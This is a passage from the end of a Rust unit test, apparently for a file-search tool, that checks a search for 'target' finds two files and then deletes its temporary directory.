            .execute(&c, json!({"pattern": "target"}))
            .await
            .unwrap();
        assert!(all.content.contains("src/a.rs"));
        assert!(all.content.contains("notes.txt"));
        std::fs::remove_dir_all(&dir).ok();
    }
}
